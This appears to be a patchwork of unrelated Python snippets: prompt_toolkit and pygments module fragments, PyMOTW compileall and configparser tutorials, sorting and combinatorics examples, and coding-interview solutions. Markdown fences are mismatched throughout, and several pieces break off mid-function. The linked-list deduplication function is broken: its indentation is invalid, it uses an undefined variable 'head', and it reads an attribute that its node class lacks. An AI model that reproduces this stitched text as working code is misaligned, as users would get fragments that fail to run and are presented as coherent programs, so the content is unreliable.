        This is a way to enforce a certain color depth in all prompt_toolkit
        applications.
        """
        # Check the `PROMPT_TOOLKIT_COLOR_DEPTH` environment variable.
        all_values = [i.value for i in ColorDepth]
        if os.environ.get("PROMPT_TOOLKIT_COLOR_DEPTH") in all_values:
            return cls(os.environ["PROMPT_TOOLKIT_COLOR_DEPTH"])

        return None

    @classmethod
    def default(cls) -> "ColorDepth":
        """
        Return the default color depth for the default output.
        """
        from .defaults import create_output

        return create_output().get_default_color_depth()

import os
import sys


ESCAPE_SEQ = "\033[%dm"
BOLD = ESCAPE_SEQ % 1
RESET = ESCAPE_SEQ % 0
COLORS = ["black", "red", "green", "yellow", "blue", "magenta", "cyan", "white"]
COLORS = dict((c, 30 + i) for i, c in enumerate(COLORS))


def colorize(text, color, is_bold=True):
    if not os.isatty(sys.stdout.fileno()):
        return text

    t = ESCAPE_SEQ % COLORS[color]
    if is_bold:
        t += BOLD
    t += text
    t += RESET
    return t
````

```py

https://en.wikipedia.org/wiki/Comb_sort

Worst-case performance: O(N^2)
```

```py


def comb_sort(arr):
    def swap(i, j):
        arr[i], arr[j] = arr[j], arr[i]

    n = len(arr)
    gap = n
    shrink = 1.3
    sorted = False
    while not sorted:
        gap = int(gap / shrink)
        if gap > 1:
            sorted = False
        else:
            gap = 1
            sorted = True

        i = 0
        while i + gap < n:
            if arr[i] > arr[i + gap]:
                swap(i, i + gap)
                sorted = False
            i = i + 1
    return arr
```

````py
https://en.wikipedia.org/wiki/Combination```


```py
from math import factorial


def combinations(n: int, k: int) -> int:
    """
    Returns the number of different combinations of k length which can
    be made from n values, where n >= k.

    Examples:
    >>> combinations(10,5)
    252

    >>> combinations(6,3)
    20

    >>> combinations(20,5)
    15504

    >>> combinations(52, 5)
    2598960

    >>> combinations(0, 0)
    1

    >>> combinations(-4, -5)
    ...
    Traceback (most recent call last):
    ValueError: Please enter positive integers for n and k where n >= k
    """

    # If either of the conditions are true, the function is being asked
    # to calculate a factorial of a negative number, which is not possible
    if n < k or k < 0:
        raise ValueError("Please enter positive integers for n and k where n >= k")
    return int(factorial(n) / ((factorial(k)) * (factorial(n - k))))


if __name__ == "__main__":

    print(
        "\nThe number of five-card hands possible from a standard",
        f"fifty-two card deck is: {combinations(52, 5)}",
    )

    print(
        "\nIf a class of 40 students must be arranged into groups of",
        f"4 for group projects, there are {combinations(40, 4)} ways",
        "to arrange them.\n",
    )

    print(
        "If 10 teams are competing in a Formula One race, there",
        f"are {combinations(10, 3)} ways that first, second and",
        "third place can be awarded.\n",
    )

#!/usr/bin/env python3
# -*- coding: utf-8 -*-
````

````pyCommands for Pyppeteer."""

import logging

from pyppeteer.chromium_downloader import check_chromium, download_chromium


def install() -> None:
    """Download chromium if not install."""
    if not check_chromium():
        download_chromium()
    else:
        logging.getLogger(__name__).warning("chromium is already installed.")

from contextlib import ExitStack, contextmanager
from typing import ContextManager, Iterator, TypeVar

_T = TypeVar("_T", covariant=True)


class CommandContextMixIn:
    def __init__(self) -> None:
        super().__init__()
        self._in_main_context = False
        self._main_context = ExitStack()

    @contextmanager
    def main_context(self) -> Iterator[None]:
        assert not self._in_main_context

        self._in_main_context = True
        try:
            with self._main_context:
                yield
        finally:
            self._in_main_context = False

    def enter_context(self, context_provider: ContextManager[_T]) -> _T:
        assert self._in_main_context

        return self._main_context.enter_context(context_provider)

from typing import List, Optional, Tuple


def parse(line: str) -> Tuple[str, str]:
    """Parses import lines for comments and returns back the
    import statement and the associated comment.
    """
    comment_start = line.find("#")
    if comment_start != -1:
        return (line[:comment_start], line[comment_start + 1 :].strip())

    return (line, "")


def add_to_line(
    comments: Optional[List[str]],
    original_string: str = "",
    removed: bool = False,
    comment_prefix: str = "",
) -> str:
    """Returns a string with comments added if removed is not set."""
    if removed:
        return parse(original_string)[0]

    if not comments:
        return original_string

    unique_comments: List[str] = []
    for comment in comments:
        if comment not in unique_comments:
            unique_comments.append(comment)
    return f"{parse(original_string)[0]}{comment_prefix} {'; '.join(unique_comments)}"

from contextlib import contextmanager


@contextmanager
def monkeypatch(obj, attribute_name, new_value):
    """
    Like pytest's monkeypatch, but as a value manager.
    """
    old_value = getattr(obj, attribute_name)
    try:
        setattr(obj, attribute_name, new_value)
        yield
    finally:
        setattr(obj, attribute_name, old_value)


def indent_block(text, indention="    "):
    """This function indents a text block with a default of four spaces."""
    temp = ""
    while text and text[-1] == "\n":
        temp += text[-1]
        text = text[:-1]
    lines = text.split("\n")
    return "\n".join(map(lambda s: indention + s, lines)) + temp

def commonCharacterCount(s1, s2):
    # To store the frequencies of characters
    # of string s1 and s2
    freq1 = [0] * 26
    freq2 = [0] * 26

    # To store the count of valid pairs
    count = 0

    # Update the frequencies of
    # the characters of string s1
    for i in range(len(s1)):
        freq1[ord(s1[i]) - ord("a")] += 1

    # Update the frequencies of
    # the characters of string s2
    for i in range(len(s2)):
        freq2[ord(s2[i]) - ord("a")] += 1

    # Find the count of valid pairs
    for i in range(26):
        count += min(freq1[i], freq2[i])

    return count

#!/usr/bin/python
# -*- coding: utf-8 -*-

# Compares elements at same
# index in 2 different arrays
# and so called generates tuple of
# that value, index, array number
# however if both numbers are equal
# returns zero simply

# Prime condition for correct results
# length(arr1) == length(arr2)


def compare_array_elements(arr1, arr2):
    for l in range(len(arr1)):
        if arr1[l] > arr2[l]:
            yield (arr1[l], l, 1)
        elif arr1[l] < arr2[l]:
            yield (arr2[l], l, 2)
        else:
            yield (0)


# Tests
tests = [
    [[21, 3454, 12, 77, 21, 90, 235], [123, 54, 21, 7, 23, 987, 21312]],
    [[1223, 8273, 17732, 7127], [12989, 2131223, 129, 10]],
]

# Does not test last condition of function
for test in tests:
    for n, index, array_n in compare_array_elements(test[0], test[1]):
        print(
            "  [ %i ] is biggest value at index(%i) from array(%i)"
            % (n, index, array_n)
        )

from typing import Any
import numpy as np

AR_i: np.ndarray[Any, np.dtype[np.int64]]
AR_f: np.ndarray[Any, np.dtype[np.float64]]
AR_c: np.ndarray[Any, np.dtype[np.complex128]]
AR_m: np.ndarray[Any, np.dtype[np.timedelta64]]
AR_M: np.ndarray[Any, np.dtype[np.datetime64]]

AR_f > AR_m  # E: Unsupported operand types
AR_c > AR_m  # E: Unsupported operand types

AR_m > AR_f  # E: Unsupported operand types
AR_m > AR_c  # E: Unsupported operand types

AR_i > AR_M  # E: Unsupported operand types
AR_f > AR_M  # E: Unsupported operand types
AR_m > AR_M  # E: Unsupported operand types

AR_M > AR_i  # E: Unsupported operand types
AR_M > AR_f  # E: Unsupported operand types
AR_M > AR_m  # E: Unsupported operand types

# Unfortunately `NoReturn` errors are not the most descriptive
_1 = AR_i > str()  # E: Need type annotation
_2 = AR_i > bytes()  # E: Need type annotation
_3 = str() > AR_M  # E: Need type annotation
_4 = bytes() > AR_M  # E: Need type annotation

from .core import *
from .codec import *
from typing import Any, Union


def ToASCII(label):
    # type: (str) -> bytes
    return encode(label)


def ToUnicode(label):
    # type: (Union[bytes, bytearray]) -> str
    return decode(label)


def nameprep(s):
    # type: (Any) -> None
    raise NotImplementedError("IDNA 2008 does not utilise nameprep protocol")

# Copyright (c) 2009 Doug Hellmann All rights reserved.
#```









---


```py


# end_pymotw_header
import compileall
import glob


def show(title):
    print(title)
    for filename in glob.glob("examples/**", recursive=True):
        print("  {}".format(filename))
    print()


show("Before")

compileall.compile_dir("examples")

show("\nAfter")

# Copyright (c) 2009 Doug Hellmann All rights reserved.
#```









---


```py


# end_pymotw_header
import compileall
import glob


def show(title):
    print(title)
    for filename in glob.glob("examples/**", recursive=True):
        print("  {}".format(filename))
    print()


show("Before")

compileall.compile_file("examples/a.py")

show("\nAfter")

# Copyright (c) 2009 Doug Hellmann All rights reserved.
#```









---


```py


# end_pymotw_header
import compileall
import re

compileall.compile_dir("examples", rx=re.compile(r"/subdir"))

# Copyright (c) 2009 Doug Hellmann All rights reserved.
#```









---


```py


# end_pymotw_header
import compileall
import sys

sys.path[:] = ["examples", "notthere"]
print("sys.path =", sys.path)
compileall.compile_path()

# Copyright (c) 2009 Doug Hellmann All rights reserved.
#```









---


```py


# end_pymotw_header
import compileall
import re

compileall.compile_dir("examples", maxlevels=0)
````

````py
    pygments.lexers.compiled
    ~~~~~~~~~~~~~~~~~~~~~~~~

    Just export lexer classes previously contained in this module.

    :copyright: Copyright 2006-2021 by the Pygments team, see AUTHORS.
    :license: BSD, see LICENSE for details.```


```py

from pygments.lexers.jvm import JavaLexer, ScalaLexer
from pygments.lexers.c_cpp import CLexer, CppLexer
from pygments.lexers.d import DLexer
from pygments.lexers.objective import ObjectiveCLexer, ObjectiveCppLexer, LogosLexer
from pygments.lexers.go import GoLexer
from pygments.lexers.rust import RustLexer
from pygments.lexers.c_like import ECLexer, ValaLexer, CudaLexer
from pygments.lexers.pascal import DelphiLexer, Modula2Lexer, AdaLexer
from pygments.lexers.business import CobolLexer, CobolFreeformatLexer
from pygments.lexers.fortran import FortranLexer
from pygments.lexers.prolog import PrologLexer
from pygments.lexers.python import CythonLexer
from pygments.lexers.graphics import GLShaderLexer
from pygments.lexers.ml import OcamlLexer
from pygments.lexers.basic import BlitzBasicLexer, BlitzMaxLexer, MonkeyLexer
from pygments.lexers.dylan import DylanLexer, DylanLidLexer, DylanConsoleLexer
from pygments.lexers.ooc import OocLexer
from pygments.lexers.felix import FelixLexer
from pygments.lexers.nimrod import NimrodLexer
from pygments.lexers.crystal import CrystalLexer

__all__ = []

# -*- coding: utf-8 -*-```


```pyAdapt readline completer interface to make ZMQ request."""

# Copyright (c) IPython Development Team.
# Distributed under the terms of the Modified BSD License.

from traitlets.config import Configurable
from traitlets import Float


class ZMQCompleter(Configurable):
    """Client-side completion machinery.

    How it works: self.complete will be called multiple times, with
    state=0,1,2,... When state=0 it should compute ALL the completion matches,
    and then return them for each value of state."""

    timeout = Float(5.0, config=True, help="timeout before completion abort")

    def __init__(self, shell, client, config=None):
        super(ZMQCompleter, self).__init__(config=config)

        self.shell = shell
        self.client = client
        self.matches = []

    def complete_request(self, code, cursor_pos):
        # send completion request to kernel
        # Give the kernel up to 5s to respond
        msg_id = self.client.complete(code=code, cursor_pos=cursor_pos)

        msg = self.client.shell_channel.get_msg(timeout=self.timeout)
        if msg["parent_header"]["msg_id"] == msg_id:
            return msg["content"]

        return {
            "matches": [],
            "cursor_start": 0,
            "cursor_end": 0,
            "metadata": {},
            "status": "ok",
        }

from typing import Dict, Tuple, Callable

CacheValues = Tuple[str, str, str]
CacheValuesCallback = Callable[[], CacheValues]


_cache: Dict[str, Dict[str, CacheValues]] = {}


def save_entry(module_name: str, name: str, cache: CacheValues) -> None:
    try:
        module_cache = _cache[module_name]
    except KeyError:
        module_cache = _cache[module_name] = {}
    module_cache[name] = cache


def _create_get_from_cache(
    number: int
) -> Callable[[str, str, CacheValuesCallback], str]:
    def _get_from_cache(
        module_name: str, name: str, get_cache_values: CacheValuesCallback
    ) -> str:
        try:
            return _cache[module_name][name][number]
        except KeyError:
            v = get_cache_values()
            save_entry(module_name, name, v)
            return v[number]

    return _get_from_cache


get_type = _create_get_from_cache(0)
get_docstring_signature = _create_get_from_cache(1)
get_docstring = _create_get_from_cache(2)
````

```py
Aim: Read a complex number as input from user, complex_num and print
its value in polar coordinates.
```

```py

# importing cmath library
import cmath

# getting the input
complex_num = complex(
    int(input("Enter your x value : ")), int(input("Enter your y value: "))
)

# using library converting the complex values into coordinates
r = float(abs(complex_num))
theta = float(cmath.phase(complex_num))

# printing the output
print("Your inputed complex number is :", complex_num)
print("r : ", r)
print("theta :", theta)
print("Hence Polar co-ordinates are : {0:0.4f} + i{1:0.4f}".format(r, theta))

```

```py
sample input 1 :
x : 4 y : 3
sample output 1 :
r : 5.0 theta : 0.643

sample input 2 :
x : 1 y : 2
sample output 2 :
r : 2.361 theta : 1.107

Explaination :
The user enters two values x and y , which stand for x+iy in complex
number notation.This inputted values are then converted into r and theta
using the abs function on x and phase function on y.
```

```py

```

````py
This module shows one-liner comprehensions where we make lists, tuples,
sets and dictionaries by looping through iterators.```


```py


def main():
    # One interesting fact about data structures is that we can build
    # them with comprehensions. Let's explain how the first one works:
    # we just want to create zeros so our expression is set to `0`
    # since no computing is required; because `0` is a constant value,
    # we can set the item that we compute with to `_`; and we want to
    # create five zeros so we set the iterator as `range(5)`
    assert [0 for _ in range(5)] == [0] * 5 == [0, 0, 0, 0, 0]

    # For the next comprehension operations, let's see what we can do
    # with a list of 3-5 letter words
    words = ["cat", "mice", "horse", "bat"]

    # Tuple comprehension can find the length for each word
    tuple_comp = tuple(len(word) for word in words)
    assert tuple_comp == (3, 4, 5, 3)

    # Set comprehension can find the unique word lengths
    set_comp = {len(word) for word in words}
    assert len(set_comp) < len(words)
    assert set_comp == {3, 4, 5}

    # Dictionary comprehension can map each word to its length
    dict_comp = {word: len(word) for word in words}
    assert len(dict_comp) == len(words)
    assert dict_comp == {"cat": 3, "mice": 4, "horse": 5, "bat": 3}


if __name__ == "__main__":
    main()

host = "localhost"
mongoPort = 27017
SOCKS5_PROXY_PORT = 1080
auth = ""
passcode = ""

# if proxy is not working please update the auth and passcode
````

````pypyzmq does not ship tornado's futures,
this just raises informative NotImplementedErrors to avoid having to change too much code.```


```py


class NotImplementedFuture(object):
    def __init__(self, *args, **kwargs):
        raise NotImplementedError(
            "pyzmq does not ship tornado's Futures, "
            "install tornado >= 3.0 for future support."
        )


Future = TracebackFuture = NotImplementedFuture


def is_future(x):
    return isinstance(x, Future)

# Singly-linked lists are already defined with this interface:
class ListNode(object):
  def __init__(self, x):
    self.value = x
    self.next = None


def condense_linked_list(node):
   root = ListNode(0)

   root.next = head
         p1 = head
            if p1 is None:
            return root.next
        p = p1.next
        if p is None:
            return root.next

        while p:
            if p.val == p1.val:
                p1.next = p.next
            else:
                p1 = p1.next

            p = p.next

        return root.next





````

````py
This module shows how to use if blocks, if-else blocks and if-elif-else
blocks to decide which lines of code to run (and skip).```


```py


def main():
    x = 1
    x_add_two = x + 2

    # This condition is obviously true
    ran_1 = False
    if x_add_two == 3:  # skip: else
        ran_1 = True  # run
    assert ran_1 is True

    # A negated condition can also be true
    ran_2 = False
    if not x_add_two == 1:  # skip: else
        ran_2 = True  # run
    assert ran_2 is True

    # There are `else` statements as well, which run if the initial condition
    # fails. Notice that one line gets skipped and this conditional does not
    # help us make a conclusion on the variable's true value
    if x_add_two == 1:
        ran_3 = False  # skip: if
    else:
        ran_3 = True  # run
    assert ran_3 is True

    # The `else` statement also runs once all other `if` and `elif` conditions
    # fail. Notice that multiple lines get skipped, and that all of the
    # conditions could have been compressed to `x_add_two != 3` for
    # simplicity. In this case, less logic results in more clarity
    if x_add_two == 1:
        ran_4 = False  # skip: if
    elif x_add_two == 2:
        ran_4 = False  # skip: if
    elif x_add_two < 3 or x_add_two > 3:
        ran_4 = False  # skip: if
    else:
        ran_4 = True  # run
    assert ran_4 is True


if __name__ == "__main__":
    main()

#!/bin/python3

import math
import os
import random
import re
import sys


#
# Complete the 'maxPresentations' function below.
#
# The function is expected to return an INTEGER.
# The function accepts following parameters:
#  1. INTEGER_ARRAY scheduleStart
#  2. INTEGER_ARRAY scheduleEnd
#


def maxPresentations(scheduleStart, scheduleEnd):
    # Write your code here
    sl = sorted((list(zip(*[scheduleStart, scheduleEnd]))), key=lambda x: x[1])
    sl = list(zip(*sl))
    lim = sl[1][0]
    n = 1
    for i in range(1, len(scheduleEnd)):
        if sl[0][i] >= lim:
            n += 1
            lim = sl[1][i]
            # print(sl[0][i], sl[1][i])
    return n


if __name__ == "__main__":
    fptr = open(os.environ["OUTPUT_PATH"], "w")

    scheduleStart_count = int(input().strip())

    scheduleStart = []

    for _ in range(scheduleStart_count):
        scheduleStart_item = int(input().strip())
        scheduleStart.append(scheduleStart_item)

    scheduleEnd_count = int(input().strip())

    scheduleEnd = []

    for _ in range(scheduleEnd_count):
        scheduleEnd_item = int(input().strip())
        scheduleEnd.append(scheduleEnd_item)

    result = maxPresentations(scheduleStart, scheduleEnd)

    fptr.write(str(result) + "\n")

    fptr.close()

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyReading a configuration file.```


```py

# end_pymotw_header
import configparser

# Require values
try:
    parser = configparser.ConfigParser()
    parser.read("allow_no_value.ini")
except configparser.ParsingError as err:
    print("Could not parse:", err)

# Allow stand-alone option names
print("\nTrying again with allow_no_value=True")
parser = configparser.ConfigParser(allow_no_value=True)
parser.read("allow_no_value.ini")
for flag in ["turn_feature_on", "turn_other_feature_on"]:
    print("\n", flag)
    exists = parser.has_option("flags", flag)
    print("  has_option:", exists)
    if exists:
        print("         get:", parser.get("flags", flag))

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```









---


```py


# end_pymotw_header
from configparser import ConfigParser
import datetime


def parse_iso_datetime(s):
    print("parse_iso_datetime({!r})".format(s))
    return datetime.datetime.strptime(s, "%Y-%m-%dT%H:%M:%S.%f")


parser = ConfigParser(converters={"datetime": parse_iso_datetime})
parser.read("custom_types.ini")

string_value = parser["datetimes"]["due_date"]
value = parser.getdatetime("datetimes", "due_date")
print("due_date : {!r} -> {!r}".format(string_value, value))

#!/usr/bin/env python3
#
# Copyright 2007 Doug Hellmann.```


```pyExample use of ConfigParser module.```


```py

# end_pymotw_header
from configparser import ConfigParser
import os

filename = "escape.ini"
config = ConfigParser()
config.read([filename])

value = config.get("escape", "value")

print(value)

#!/usr/bin/env python3
#
# Copyright 2007 Doug Hellmann.```


```pyExample use of ConfigParser module.```


```py

# end_pymotw_header
from configparser import ConfigParser
import os

filename = "approach.ini"
config = ConfigParser()
config.read([filename])

url = config.get("portal", "url")

print(url)

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyUsing the extended interpolation syntax.```


```py

# end_pymotw_header
from configparser import ConfigParser, ExtendedInterpolation

parser = ConfigParser(interpolation=ExtendedInterpolation())
parser.read("extended_interpolation.ini")

print("Original value       :", parser.get("bug_tracker", "url"))

parser.set("intranet", "port", "9090")
print("Altered port value   :", parser.get("bug_tracker", "url"))

print("Without interpolation:", parser.get("bug_tracker", "url", raw=True))

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyReading a configuration file.```


```py

# end_pymotw_header
from configparser import ConfigParser

parser = ConfigParser()
parser.read("multisection.ini")

SECTIONS = ["wiki", "none"]
OPTIONS = ["username", "password", "url", "description"]

for section in SECTIONS:
    has_section = parser.has_section(section)
    print("{} section exists: {}".format(section, has_section))
    for candidate in OPTIONS:
        has_option = parser.has_option(section, candidate)
        print("{}.{:<12}  : {}".format(section, candidate, has_option))
    print()

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyReading a configuration file.```


```py

# end_pymotw_header
from configparser import ConfigParser

parser = ConfigParser()
parser.read("multisection.ini")

for candidate in ["wiki", "bug_tracker", "dvcs"]:
    print("{:<12}: {}".format(candidate, parser.has_section(candidate)))

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyReading a configuration file.```


```py

# end_pymotw_header
from configparser import ConfigParser

parser = ConfigParser()
parser.read("interpolation.ini")

print("Original value       :", parser.get("bug_tracker", "url"))

parser.set("bug_tracker", "port", "9090")
print("Altered port value   :", parser.get("bug_tracker", "url"))

print("Without interpolation:", parser.get("bug_tracker", "url", raw=True))

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyReading a configuration file.```


```py

# end_pymotw_header
from configparser import ConfigParser

parser = ConfigParser()
parser.read("interpolation_defaults.ini")

print("URL:", parser.get("bug_tracker", "url"))

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyDefault handling.```


```py

# end_pymotw_header
import configparser

parser = configparser.ConfigParser()

parser.add_section("bug_tracker")
parser.set("bug_tracker", "url", "http://%(server)s:%(port)s/bugs")

try:
    print(parser.get("bug_tracker", "url"))
except configparser.InterpolationMissingOptionError as err:
    print("ERROR:", err)

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyDefault handling.```


```py

# end_pymotw_header
import configparser

parser = configparser.ConfigParser()

parser.add_section("sect")
parser.set("sect", "opt", "%(opt)s")

try:
    print(parser.get("sect", "opt"))
except configparser.InterpolationDepthError as err:
    print("ERROR:", err)

#!/usr/bin/env python3
#
# Copyright 2015 Doug Hellmann.```


```pyExample use of ConfigParser module.```


```py

# end_pymotw_header
from configparser import ConfigParser
import os

filename = "multiline.ini"
config = ConfigParser()
config.read([filename])

message = config["example"]["message"]

print(message)

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyDisabling interpolation```


```py

# end_pymotw_header
from configparser import ConfigParser

parser = ConfigParser(interpolation=None)
parser.read("interpolation.ini")

print("Without interpolation:", parser.get("bug_tracker", "url"))

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyDefault handling.```


```py

# end_pymotw_header
import configparser

parser = configparser.ConfigParser()

parser.add_section("bug_tracker")
parser.set("bug_tracker", "url", "http://localhost:8080/bugs")
parser.set("bug_tracker", "username", "dhellmann")
parser.set("bug_tracker", "password", "secret")

for section in parser.sections():
    print(section)
    for name, value in parser.items(section):
        print("  {} = {!r}".format(name, value))

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyReading a configuration file.```


```py

# end_pymotw_header
from configparser import ConfigParser

parser = ConfigParser()
parser.read("simple.ini")

print(parser.get("bug_tracker", "url"))

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyReading a configuration file.```


```py

# end_pymotw_header
from configparser import ConfigParser
import glob

parser = ConfigParser()

candidates = [
    "does_not_exist.ini",
    "also-does-not-exist.ini",
    "simple.ini",
    "multisection.ini",
]

found = parser.read(candidates)

missing = set(candidates) - set(found)

print("Found config files:", sorted(found))
print("Missing files     :", sorted(missing))

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyReading a configuration file.```


```py

# end_pymotw_header
from configparser import ConfigParser

parser = ConfigParser()
parser.read("multisection.ini")

print("Read values:\n")
for section in parser.sections():
    print(section)
    for name, value in parser.items(section):
        print("  {} = {!r}".format(name, value))

parser.remove_option("bug_tracker", "password")
parser.remove_section("wiki")

print("\nModified values:\n")
for section in parser.sections():
    print(section)
    for name, value in parser.items(section):
        print("  {} = {!r}".format(name, value))

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyReading a configuration file.```


```py

# end_pymotw_header
from configparser import ConfigParser

parser = ConfigParser()
parser.read("multisection.ini")

for section_name in parser.sections():
    print("Section:", section_name)
    print("  Options:", parser.options(section_name))
    for name, value in parser.items(section_name):
        print("  {} = {}".format(name, value))
    print()

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyReading a configuration file.```


```py

# end_pymotw_header
from configparser import ConfigParser

parser = ConfigParser()
parser.read("multisection.ini")

for section_name in parser:
    print("Section:", section_name)
    section = parser[section_name]
    print("  Options:", list(section.keys()))
    for name in section:
        print("  {} = {}".format(name, section[name]))
    print()

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyReading a configuration file.```


```py

# end_pymotw_header
from configparser import ConfigParser
import codecs

parser = ConfigParser()
# Open the file with the correct encoding
parser.read("unicode.ini", encoding="utf-8")

password = parser.get("bug_tracker", "password")

print("Password:", password.encode("utf-8"))
print("Type    :", type(password))
print("repr()  :", repr(password))

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyReading a configuration file.```


```py

# end_pymotw_header
from configparser import ConfigParser

parser = ConfigParser()
parser.read("types.ini")

print("Integers:")
for name in parser.options("ints"):
    string_value = parser.get("ints", name)
    value = parser.getint("ints", name)
    print("  {:<12} : {!r:<7} -> {}".format(name, string_value, value))

print("\nFloats:")
for name in parser.options("floats"):
    string_value = parser.get("floats", name)
    value = parser.getfloat("floats", name)
    print("  {:<12} : {!r:<7} -> {:0.2f}".format(name, string_value, value))

print("\nBooleans:")
for name in parser.options("booleans"):
    string_value = parser.get("booleans", name)
    value = parser.getboolean("booleans", name)
    print("  {:<12} : {!r:<7} -> {}".format(name, string_value, value))

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyDefault handling.```


```py

# end_pymotw_header
import configparser
import sys

parser = configparser.ConfigParser()

parser.add_section("bug_tracker")
parser.set("bug_tracker", "url", "http://localhost:8080/bugs")
parser.set("bug_tracker", "username", "dhellmann")
parser.set("bug_tracker", "password", "secret")

parser.write(sys.stdout)

# Licensed under the GPL: https://www.gnu.org/licenses/old-licenses/gpl-2.0.html
# For details: https://github.com/PyCQA/pylint/blob/main/LICENSE

from pylint.config.option_manager_mixin import OptionsManagerMixIn
from pylint.config.options_provider_mixin import OptionsProviderMixIn


class ConfigurationMixIn(OptionsManagerMixIn, OptionsProviderMixIn):
    """basic mixin for simple configurations which don't need the
    manager / providers model"""

    def __init__(self, *args, **kwargs):
        if not args:
            kwargs.setdefault("usage", "")
        OptionsManagerMixIn.__init__(self, *args, **kwargs)
        OptionsProviderMixIn.__init__(self)
        if not getattr(self, "option_groups", None):
            self.option_groups = []
            for _, optdict in self.options:
                try:
                    gdef = (optdict["group"].upper(), "")
                except KeyError:
                    continue
                if gdef not in self.option_groups:
                    self.option_groups.append(gdef)
        self.register_options_provider(self, own_group=False)
````

```py
https://en.wikipedia.org/wiki/Component_(graph_theory)

Finding connected components in graph
```

```py

test_graph_1 = {0: [1, 2], 1: [0, 3], 2: [0], 3: [1], 4: [5, 6], 5: [4, 6], 6: [4, 5]}

test_graph_2 = {0: [1, 2, 3], 1: [0, 3], 2: [0], 3: [0, 1], 4: [], 5: []}


def dfs(graph: dict, vert: int, visited: list) -> list:
    """
    Use depth first search to find all vertices
    being in the same component as initial vertex
    >>> dfs(test_graph_1, 0, 5 * [False])
    [0, 1, 3, 2]
    >>> dfs(test_graph_2, 0, 6 * [False])
    [0, 1, 3, 2]
    """

    visited[vert] = True
    connected_verts = []

    for neighbour in graph[vert]:
        if not visited[neighbour]:
            connected_verts += dfs(graph, neighbour, visited)

    return [vert] + connected_verts


def connected_components(graph: dict) -> list:
    """
    This function takes graph as a parameter
    and then returns the list of connected components
    >>> connected_components(test_graph_1)
    [[0, 1, 3, 2], [4, 5, 6]]
    >>> connected_components(test_graph_2)
    [[0, 1, 3, 2], [4], [5]]
    """

    graph_size = len(graph)
    visited = graph_size * [False]
    components_list = []

    for i in range(graph_size):
        if not visited[i]:
            i_connected = dfs(graph, i, visited)
            components_list.append(i_connected)

    return components_list


if __name__ == "__main__":
    import doctest

    doctest.testmod()

import builtins
import enum
import sys

PY37_PLUS = sys.version_info >= (3, 7)
PY38_PLUS = sys.version_info >= (3, 8)
PY39_PLUS = sys.version_info >= (3, 9)
PY310_PLUS = sys.version_info >= (3, 10)


class Context(enum.Enum):
    Load = 1
    Store = 2
    Del = 3


# TODO Remove in 3.0 in favor of Context
Load = Context.Load
Store = Context.Store
Del = Context.Del

BUILTINS = builtins.__name__  # Could be just 'builtins' ?
```

````py
Container With Most Water

Given n non-negative integers a1, a2, ..., an , where each represents a point at coordinate (i, ai).
n vertical lines are drawn such that the two endpoints of line i is at (i, ai) and (i, 0).
Find two lines, which together with x-axis forms a container, such that the container contains the most water.

Input: [1,8,6,2,5,4,8,3,7]
Output: 49

=========================================
Playing with pointers from both sides, eliminate smaller heights and search for a bigger height.
    Time Complexity:    O(N)
    Space Complexity:   O(1)```


```py


############
# Solution #
############


def max_area(height):
    l = 0
    r = len(height) - 1
    max_height = 0

    while l < r:
        left = height[l]
        right = height[r]

        current_height = min(left, right) * (r - l)
        max_height = max(max_height, current_height)

        # take the smaller side and search for a bigger height on that side
        if left < right:
            while (l < r) and (left >= height[l]):
                l += 1
        else:
            while (l < r) and (right >= height[r]):
                r -= 1

    return max_height


###########
# Testing #
###########

# Test 1
# Correct result => 49
print(max_area([1, 8, 6, 2, 5, 4, 8, 3, 7]))

# gives True if two duplicate numbers in the nums array are within k distance
# (inclusive) of one another, measuring by absolute difference in index

# did relatively well on this one, made a greater-than/less-than flip error on
# the conditional for the true case and needed to rewrite my code to remove
# keys from the dictionary without editing it while looping over it, but
# otherwise went well!

# problem considered medium difficulty, from Palantir


def containsCloseNums(nums, k):
    num_dict = {}
    # setup keys for each number seen, then list their indices
    for i, item in enumerate(nums):
        if item in num_dict:
            num_dict[item].append(i)
        else:
            num_dict[item] = [i]

    # remove all nums that are not repeated
    # first make a set of keys to remove to prevent editing the dictionary size while iterating over it
    removals = set()
    for key in num_dict.keys():
        if len(num_dict[key]) < 2:
            removals.add(key)

    # now remove each key from the num_dict that has fewer than two values
    for key in removals:
        num_dict.pop(key)

    # now check remaining numbers to see if they fall within the desired range
    for key in num_dict.keys():
        last_ind = num_dict[key][0]
        for next_ind in num_dict[key][1:]:
            if next_ind - last_ind <= k:
                return True
            last_ind = next_ind

    return False

# Ported from python 3.7 contextlib.py
class nullcontext(object):
    """Context manager that does no additional processing.
    Used as a stand-in for a normal context manager, when a particular
    block of code is only sometimes used with a normal context manager:
    cm = optional_cm if condition else nullcontext()
    with cm:
        # Perform operation, using optional_cm if condition is True
    """

    def __init__(self, enter_result=None):
        self.enter_result = enter_result

    def __enter__(self):
        return self.enter_result

    def __exit__(self, *excinfo):
        pass

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyImplementing the context manager API by hand.```


```py

# end_pymotw_header
class Context:
    def __init__(self):
        print("__init__()")

    def __enter__(self):
        print("__enter__()")
        return self

    def __exit__(self, exc_type, exc_val, exc_tb):
        print("__exit__()")


with Context():
    print("Doing work in the context")

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyImplementing the context manager API by hand.```


```py

# end_pymotw_header
class Context:
    def __init__(self, handle_error):
        print("__init__({})".format(handle_error))
        self.handle_error = handle_error

    def __enter__(self):
        print("__enter__()")
        return self
